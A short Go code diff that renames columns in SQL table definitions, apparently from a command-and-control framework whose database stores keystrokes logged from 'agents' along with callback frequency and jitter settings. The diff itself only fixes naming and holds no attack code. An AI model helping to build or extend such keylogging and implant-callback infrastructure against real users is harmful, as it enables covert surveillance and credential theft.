@@ -128,9 +128,9 @@ func InitDatabase() {
 
 	KeylogSQL := `
 	CREATE TABLE IF NOT EXISTS "keylog" (
-		"keylogID" SERIAL PRIMARY KEY,
+		"keylog_id" SERIAL PRIMARY KEY,
 		"uuid" TEXT,
-		"Keys" TEXT,
+		"keys" TEXT,
 		FOREIGN KEY ("uuid") REFERENCES "agents" ("uuid")
 	);
 	`
@@ -150,7 +150,7 @@ func InitDatabase() {
 		"server_port" TEXT,
 		"callback_frequency" TEXT,
 		"callback_jitter" TEXT,
-		"doncat" TEXT,
+		"concat" TEXT,
 		"is_deleted" INTEGER NOT NULL DEFAULT 0
 	);
 	`
